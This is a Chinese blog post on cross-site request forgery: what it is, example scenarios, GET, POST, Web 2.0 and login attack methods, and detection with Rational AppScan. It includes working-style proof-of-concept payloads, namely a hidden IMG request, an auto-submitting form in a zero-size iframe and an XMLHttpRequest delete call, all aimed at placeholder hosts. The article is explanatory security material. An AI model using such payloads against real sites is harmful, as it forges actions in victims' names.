@@ -1,0 +1,814 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Linux安全," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="Web 应用程序常见漏洞 CSRF 的入侵检测与防范&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;互联网的安全问题一直存在，并且在可预见的未来中没有消弭的迹象，而在软件开发周期中，加入对产品安全问题的检测工作，将极大的提升对应安全问题解决的成本，对维护一个好的产品形象至关重，在竞争愈烈的网络应用产品中的生命力也将更长。本文要介绍的跨站请求伪（CSR">
+<meta name="keywords" content="Linux安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web 应用程序常见漏洞 CSRF 的入侵检测与防范">
+<meta property="og:url" content="https://hcldirgit.github.io/2017/08/17/Linux安全/3. Web 应用程序常见漏洞 CSRF 的入侵检测与防范/index.html">
+<meta property="og:site_name" content="失落的乐章">
+<meta property="og:description" content="Web 应用程序常见漏洞 CSRF 的入侵检测与防范&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;互联网的安全问题一直存在，并且在可预见的未来中没有消弭的迹象，而在软件开发周期中，加入对产品安全问题的检测工作，将极大的提升对应安全问题解决的成本，对维护一个好的产品形象至关重，在竞争愈烈的网络应用产品中的生命力也将更长。本文要介绍的跨站请求伪（CSR">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://github.com/hcldirgit/image/blob/master/Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%20CSRF%20%E7%9A%84%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%98%B2%E8%8C%83/01.jpeg?raw=true">
+<meta property="og:image" content="https://github.com/hcldirgit/image/blob/master/Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%20CSRF%20%E7%9A%84%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%98%B2%E8%8C%83/02.jpeg?raw=true">
+<meta property="og:image" content="https://github.com/hcldirgit/image/blob/master/Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%20CSRF%20%E7%9A%84%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%98%B2%E8%8C%83/03.jpeg?raw=true">
+<meta property="og:image" content="http://mysite/service?action=delete&pageid=100001">
+<meta property="og:updated_time" content="2017-08-16T07:13:31.541Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Web 应用程序常见漏洞 CSRF 的入侵检测与防范">
+<meta name="twitter:description" content="Web 应用程序常见漏洞 CSRF 的入侵检测与防范&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;互联网的安全问题一直存在，并且在可预见的未来中没有消弭的迹象，而在软件开发周期中，加入对产品安全问题的检测工作，将极大的提升对应安全问题解决的成本，对维护一个好的产品形象至关重，在竞争愈烈的网络应用产品中的生命力也将更长。本文要介绍的跨站请求伪（CSR">
+<meta name="twitter:image" content="https://github.com/hcldirgit/image/blob/master/Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%20CSRF%20%E7%9A%84%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%98%B2%E8%8C%83/01.jpeg?raw=true">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://hcldirgit.github.io/2017/08/17/Linux安全/3. Web 应用程序常见漏洞 CSRF 的入侵检测与防范/"/>
+
+
+
+
+
+  <title>Web 应用程序常见漏洞 CSRF 的入侵检测与防范 | 失落的乐章</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', '85*****1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?87980c**************99ec5e26fb5";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">失落的乐章</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">技术面前，永远都是学生。</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-message">
+          <a href="/message" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            留言
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="https://hcldirgit.github.io/2017/08/17/Linux安全/3. Web 应用程序常见漏洞 CSRF 的入侵检测与防范/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="失落的乐章">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/0.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="失落的乐章">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Web 应用程序常见漏洞 CSRF 的入侵检测与防范</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-17T09:50:35+08:00">
+                2017-08-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="Web-应用程序常见漏洞-CSRF-的入侵检测与防范"><a href="#Web-应用程序常见漏洞-CSRF-的入侵检测与防范" class="headerlink" title="Web 应用程序常见漏洞 CSRF 的入侵检测与防范"></a>Web 应用程序常见漏洞 CSRF 的入侵检测与防范</h1><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;互联网的安全问题一直存在，并且在可预见的未来中没有消弭的迹象，而在软件开发周期中，加入对产品安全问题的检测工作，将极大的提升对应安全问题解决的成本，对维护一个好的产品形象至关重，在竞争愈烈的网络应用产品中的生命力也将更长。本文要介绍的跨站请求伪（CSRF）在众多的攻击手段中，更具备隐蔽性，同时有更高的危害性。笔者将对其的基本特性，攻击手段，危害及防范手段，以及如何使用 Rational AppScan 对 CSRF 攻击做检测及分析做一个系统的阐述。</p>
+<h2 id="CSRF-的基本概念特性"><a href="#CSRF-的基本概念特性" class="headerlink" title="CSRF 的基本概念特性"></a>CSRF 的基本概念特性</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;跨站请求伪造（CSRF）的是 Web 应用程序一种常见的漏洞，其攻击特性是危害性大但非常隐蔽，尤其是在大量 Web 2.0 技术的应用的背景下，CSRF 攻击完全可以在用户法毫无察觉的情况下发起攻击。国际上并未对 CSRF 攻击做出一个明确的定义，同时，攻击的发起手段方式繁多，下文会做详细介绍。可以解释的是发起的目标都是通过伪造一个用户请求，该请求不是用户想发出去的请求，而对服务器或服务来说这个请求是完全合法的一个请求，但是却完成了一个攻击者所期望的操作，比如添加一个用户到管理者的群组中，或将一个用户的现金转到另外的一个帐户中。通常开发人员对 CSRF 攻击的理解是有误区的，分为以下几方面，第一是如何攻击的，第二是危害到底在那里，第三是如何防范就才是一个完整的解决方案。本文就是要对这些基本的问题做一个详细的阐述，并且给出检测的有效方法。</p>
+<h2 id="CSRF-的危害实例"><a href="#CSRF-的危害实例" class="headerlink" title="CSRF 的危害实例"></a>CSRF 的危害实例</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;大部分网站往往对脚本注入有严格的防范，但是对 CSRF 的防范做的就差很多。</p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;<strong>实例 1</strong>：假设某网站高级会员会享有某些特殊权限。而当一个普通用户付款完毕就可以让管理员将自己升级为高级会员。假设管理员将一个普通用户升级为高级会员的请求是：</p>
+<p><a href="http://www.mysite.com/promoteUser.jsp?username=aaaaa" target="_blank" rel="external">http://www.mysite.com/promoteUser.jsp?username=aaaaa</a></p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们再假设普通用户有在网站某个论坛发表话题的权限，这样一个普通用户可以将这个 URL 发表在某些话题之中，然后用我们称为社会工程学的方法引诱网站管理员点击这个链接。当管理员点击这个链接时，这个请求就会从浏览器发送到后台服务器，从而完成身份的升级。当然，在实际攻击过程中，有很多手段使得让管理员不点击也能发送这样的请求，比如将这个 URL 设置为某个图片的源。</p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;<strong>实例 2</strong>：以一个二手跳蚤市场为例子，比如某商业交易网站注册用户 Hacker01 和     Customer01。Hacker01 在上交易频道摆上 1 辆 9 成新的宝马，投标价格是 20000$，另外再摆上另外一量废旧车型标价 1000$，然而网站是允许加载图片显示车的状况的。    所以宝马车主可以上载一个自己的图片，废旧车主也可以上载一个自己的图片。</p>
+<p>宝马图片 url:<a href="http://myrepository/BMW.jpg" target="_blank" rel="external">http://myrepository/BMW.jpg</a> car id 100000001</p>
+<p>废旧车图片 url:<a href="http://myrepository/oldCar.jpg" target="_blank" rel="external">http://myrepository/oldCar.jpg</a> car id 100000002</p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;而该拍卖网站是通过投标决定车的最终价格，假设是竞买者参加竞买宝马的时候点击购买按钮浏览器是通过发一个 GET 请求到 <a href="http://e-bussiness-car/bid?value=20000$&amp;carid=100000001" target="_blank" rel="external">http://e-bussiness-car/bid?value=20000$&amp;carid=100000001</a> 来提交自己的竞标价格。那么 Hacker01 则可以把废    旧车图片修改为 <a href="http://e-bussiness-car/bid?value=20000$&amp;carid=100000001（或者其他的" target="_blank" rel="external">http://e-bussiness-car/bid?value=20000$&amp;carid=100000001（或者其他的</a> value 参数的数值）。</p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这时候的情况是：Customer01 访问宝马能看见正确的图片，并且没有任何问题。而访问废旧车发现图片是一个无法看到的图片，但当 Customer01 浏览旧车图片的时候，浏览器已经向宝马车发送了一个竞标请求。这样在用户的控制之外发出了一个合法的请求，并且被服务器接收。Hack01 可以在 Customer01 不知觉的情况下将自己的宝马车卖出。通过此例可以发现 CSRF 有着非常严重的危害性。</p>
+<h2 id="CSRF-攻击的基本路径及方法"><a href="#CSRF-攻击的基本路径及方法" class="headerlink" title="CSRF 攻击的基本路径及方法"></a>CSRF 攻击的基本路径及方法</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HTTP 协议中定义了，GET/POST/PUT/DELETE 四种基本操作方法如图 1 标记-1 所示 GET/POST 是所有网站或服务器必须使用的操作方法，而 PUT/DELETE 功能强大，但是在以往的应用中并没有被广泛的使用，直到 Web 2.0 的出现，Ajax 的引用导致     PUT/DELETE 在 REST 框架下被发扬光大，大量使用，也使 CSRF 的攻击手段中多了一种    攻击方式。本文以常用的 GET/POST 为实例，这两者是被浏览器用作与服务起进行数据交互的主要手段，并包含 Ajax 框架下的攻击介绍。</p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;CSRF 攻击的方法多种多样，而对这些攻击方法的认识将更有助于去检查或在产品设计中加入对 CSRF 攻击的防范使整个产品的开发的代价更小。按照攻击的方式来看，分为显式攻击和隐式攻击。显示攻击对用户来说是可以察觉的，例如通过各种方法向受害者发送链接，而隐式攻击则很难察觉，往往是访问了一个有漏洞的页面，或者一个恶意的页面，使用频率更多的则是隐性攻击，因为其更具备可操作性。下边介绍到的攻击方法都可以采取隐式攻击方法。要注意的是，用户网站是否存在脚本注入的漏洞，并不影    响 CSRF 攻击，通过使用第 3 方存在安全隐患的网站一样可以完成 CSRF 攻击。<br>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对图 1 的基本解释，标记-1 是合法用户对用户网站的访问，执行合法有效的操作；标记-2 是通过邮件系统对用户发动攻击；标记 3 是利用 Web 的网站，包括用户的操作网站，普通网站，以及黑客网站，标记-4、5、6 指的是有害用户（标记-3）利用的 3 种方式来攻击受害用户。</p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;图 1. CSRF 攻击示意图</p>
+<p><img src="https://github.com/hcldirgit/image/blob/master/Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%20CSRF%20%E7%9A%84%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%98%B2%E8%8C%83/01.jpeg?raw=true" alt=""></p>
+<h2 id="对-GET-请求的-CSRF-漏洞的攻击方式"><a href="#对-GET-请求的-CSRF-漏洞的攻击方式" class="headerlink" title="对 GET 请求的 CSRF 漏洞的攻击方式"></a>对 GET 请求的 CSRF 漏洞的攻击方式</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;GET 请求使用的频率最高，隐式的 GET 请求，例如 <img> <script\><frame><iframe>，在页面中引入上述页面元素，并且设置 SRC 属性就能在用户未知的情况下发出一个 GET 请求到想去攻击的网站。</iframe></script\></p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以 IMG 标签为例，攻击者可以通过在图 1 中的标记-5、标记-6、标记-2、标记-4 的途径发起攻击。这种攻击的特征是无明显提示，但是已经发出一个具有完整合法的用户请求。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=http://UserSite/admin/deletepage?id=74NBCDSEFG/&gt;</div></pre></td></tr></table></figure>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于一个大量采用 GET 请求的网站，隐式的通过 http 标签发出一个 GET 请求将是致命的。</p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;具体的可执行情形描述将在如何检测部分给出。</p>
+<h2 id="对-POST-请求的-CSRF-漏洞的攻击方式"><a href="#对-POST-请求的-CSRF-漏洞的攻击方式" class="headerlink" title="对 POST 请求的 CSRF 漏洞的攻击方式"></a>对 POST 请求的 CSRF 漏洞的攻击方式</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对 CSRF 有一种理解是把 GET 改为 POST 请求就认为是可以防止被攻击实际上是一种错误的理解，通过使用 <iframe> 一样可以完成一个隐式的 CSRF 攻击，具体脚本写法如下。</iframe></p>
+<h3 id="清单-1-Frame1-html-脚本"><a href="#清单-1-Frame1-html-脚本" class="headerlink" title="清单 1. Frame1.html 脚本"></a>清单 1. Frame1.html 脚本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line"><span class="keyword">function</span> post(url, fields) &#123;</div><div class="line">	var p = document.createElement(<span class="string">'form'</span>);</div><div class="line">	p.action = url;</div><div class="line">	p.innerHTML = fields;</div><div class="line">	p.target = <span class="string">'_self'</span>;</div><div class="line">	p.enctype = <span class="string">'multipart/form-data'</span>;</div><div class="line">	p.method = <span class="string">'post'</span>;</div><div class="line">	document.body.appendChild(p);</div><div class="line">	p.submit();</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">function</span> <span class="function"><span class="title">csrf_hack</span></span>() &#123;</div><div class="line">	var fields;</div><div class="line">	var csrf=<span class="string">"&lt;addMember </span></div><div class="line"><span class="string">	  dnName="</span>CN=manager 9/OU=Managers/OU=Users/O=QDSVT/DC=CN/DC=IBM/DC=COM<span class="string">" </span></div><div class="line"><span class="string">	  accessLevel="</span>Author<span class="string">" isPerson="</span>1<span class="string">" isLocal="</span>0<span class="string">"/&gt;"</span>;</div><div class="line">	fields += <span class="string">"&lt;input type='' name='action' value='"</span>+csrf+<span class="string">"'&gt;"</span>;</div><div class="line">	unescape(fields);</div><div class="line">	post(<span class="string">'http://usersite:80/dm/services/DocumentService?do401=true'</span>,fields);</div><div class="line">	alert(<span class="string">"csrf_end"</span>);</div><div class="line">&#125;</div><div class="line">	csrf_hack();</div><div class="line">	alert(<span class="string">'end'</span>)</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
+<h3 id="清单-2-IFrame-html"><a href="#清单-2-IFrame-html" class="headerlink" title="清单 2. IFrame.html"></a>清单 2. IFrame.html</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IFRAME src=./frame1.html width=0 height=0&gt;&lt;/IFRAME&gt;</div></pre></td></tr></table></figure>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这段代码通过脚本构造一个表单提交，通过 IFRAME 加载页面自动执行本例，IFRAME 宽高属性设置成零的目的是为了达到隐式攻击的效果，JAVASCRIPT 只对窗口的大小有不成文的规范，宽高不能小于 50 像素点，但是对 iframe 并没有要求，这为隐式的跨域 Post 攻击提供了一个量好的途径。写成脚本的形式并不是说明只要被检测的站点没有脚本注入就没有任何问题，POST 隐式攻击方式一样可以通过第 3 方，如图 1，4，5，6 攻击路径都适合本例的使用。</p>
+<h2 id="Web-2-0-攻击方式"><a href="#Web-2-0-攻击方式" class="headerlink" title="Web 2.0 攻击方式"></a>Web 2.0 攻击方式</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Web 2.0 技术因其能大幅度提升用户的体验，已经被非常广泛的使用，并且 Web 2.0 技术对跨站请求的提交有严格的检查，所以一般不用担心来自第三方的 xmlhttp 发出的 CSRF 攻击。Web 2.0 技术如果在本站点存在脚本注入漏洞，将会产生严重的 CSRF 攻击问题；另外一条攻击路径则是通过邮件系统，向受害用户发送带有 xmlhttp 请求的脚本文件，是否产生危害取决于用户是否执行该文件，危害性明显低于前两种。</p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于发邮件，或者网站上传的文件发起攻击的案例是由 IE 的特性造成，由于 IE 允许从本地域 (local domain) 对任意域发送，一个包含 Web 2.0 代码的例子就能使 IE 完成成一次离线状态的攻击，IE 允许通过对策略的修改以达到严格的安全配置，从而禁止对同域内容的访问。</p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以下是通常使用的对 Web 2.0 类型的跨站漏洞的攻击代码。</p>
+<h3 id="清单-3-通常使用的对-Web-2-0-类型的跨站漏洞的攻击代码"><a href="#清单-3-通常使用的对-Web-2-0-类型的跨站漏洞的攻击代码" class="headerlink" title="清单 3. 通常使用的对 Web 2.0 类型的跨站漏洞的攻击代码"></a>清单 3. 通常使用的对 Web 2.0 类型的跨站漏洞的攻击代码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">alert(<span class="string">'start delete'</span>);</div><div class="line">var payload=<span class="string">"&lt;soap:Envelope xmlns:soap="</span>http://schemas.xmlsoap.org/soap/envelope/<span class="string">" </span></div><div class="line"><span class="string">  xmlns:xsi="</span>http://www.w3.org/2001/XMLSchema-instance<span class="string">" </span></div><div class="line"><span class="string">  xmlns:xsd="</span>http://www.w3.org/2001/XMLSchema<span class="string">"&gt;&lt;soap:Header&gt;</span></div><div class="line"><span class="string">  &lt;serviceVersion&gt;8.0.0</span></div><div class="line"><span class="string">  &lt;/serviceVersion&gt;&lt;/soap:Header&gt;&lt;soap:Body&gt;&lt;deleteDocument </span></div><div class="line"><span class="string">  xmlns="</span>http://webservices.clb.content.ibm.com<span class="string">"&gt; </span></div><div class="line"><span class="string">    &lt;path&gt;/@Pcsrftestplace/@RMain.nsf/@F/@DE44FD4FF0956D07648257570002C42DA</span></div><div class="line"><span class="string">    &lt;/path&gt;</span></div><div class="line"><span class="string">    &lt;/deleteDocument&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;"</span>;</div><div class="line">alert(message);</div><div class="line">var client = new XMLHttpRequest();</div><div class="line"> client.open(<span class="string">"POST"</span>, </div><div class="line"> <span class="string">"http://usercite.com /files/form/api/collections/</span></div><div class="line"><span class="string"> 2d0f6188-8872-4722-8922-3a3c842aa443/entry?format=xml "</span>);</div><div class="line"> client.setRequestHeader(<span class="string">"Content-Type"</span>, <span class="string">"text/plain;charset=UTF-8"</span>);</div><div class="line"> client.setRequestHeader(<span class="string">"x-method-override"</span>,<span class="string">"DELETE"</span>); </div><div class="line"> client.setRequestHeader(<span class="string">"x-requested-with"</span>,<span class="string">"XMLHttpRequest"</span>);</div><div class="line"> (you can customized the header <span class="keyword">if</span> you need)</div><div class="line"> client.send(<span class="string">""</span>);</div><div class="line">&lt;/script&gt; </div><div class="line">&lt;html&gt;</div></pre></td></tr></table></figure>
+<h2 id="登陆-CSRF-攻击方式"><a href="#登陆-CSRF-攻击方式" class="headerlink" title="登陆 CSRF 攻击方式"></a>登陆 CSRF 攻击方式</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;登陆式的跨站请求伪造是一种较新的攻击方式，让用户错误的以为是用自己的帐户密码登陆，实际上是登录到一个 Hacker 的账户。这种攻击方式的最显著的特征是，Hacker 可以监听到用户的实际操作，通过查询历史记录可以知道用户做了那些操作，如果是在商业网站则会在历史记录中留下信用卡号，如果是在个人信息相关系统则会留下用户的隐私操作。</p>
+<h2 id="使用-Rational-AppScan-对-CSRF-的检测"><a href="#使用-Rational-AppScan-对-CSRF-的检测" class="headerlink" title="使用 Rational AppScan 对 CSRF 的检测"></a>使用 Rational AppScan 对 CSRF 的检测</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;APPSCAN 是 IBM 收购 WatchFire 之后获得一款强大的网络安全的检测工具，目前属于 Rational 产品线，功能集中在网络应用产品的检测防范上，分静态与动态两种不同的功能，覆盖代码与产品的两端检测需求。</p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;APPSCAN 自从 7.7 的版本以后加入对 CSRF 的防范，基本原理是通过对同一个需要检测的 URL 或者 SERVICE 按照顺序发出两次请求，发送两次请求之间会做一次退出登录状态的操作，如果一个对 CSRF 已经进行防范的网站是会发送回两个不同的回应内容。实例的说明如下。</p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;<strong>请求 1</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">GET/POST http://myproduct.com/services?action=remove&amp;id=10002</div><div class="line">Headers ….. …..</div><div class="line"></div><div class="line">	</div><div class="line">Content: ……</div></pre></td></tr></table></figure>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;<strong>返回内容 1</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Response 200</div><div class="line">Headers …. …..</div><div class="line">Content:…..</div></pre></td></tr></table></figure>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;<strong>请求 2</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">GET/POST http://myproduct.com/services?action=remove&amp;id=10002</div><div class="line">Headers ….. …..</div><div class="line"></div><div class="line">	</div><div class="line">Content: ……</div></pre></td></tr></table></figure>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;<strong>返回内容 2</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Response 200</div><div class="line">Headers …. …..</div><div class="line">Content:…..</div></pre></td></tr></table></figure>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;返回内容 1 和返回内容 2 如果是完全一致的则可以认为是有问题的，反之则可以认为是没有问题。看似简单的原理，在实际操作中有个很繁琐的逻辑问题，比如请求 1 是一个删除动作，那么如何去构造一个请求 2，并且获得一个一致的结果呢？解决的办法是，要先做一个操作 1，然后再创建一个同样的 1，再做操作 2。</p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从上述的简单例子就可以发现有效监测 CSRF 是一个较为繁琐的过程。AppScan 的检测前提就是对目标资源的操作在不同的一个 Session 中返回的内容肯定是应该不一样的。</p>
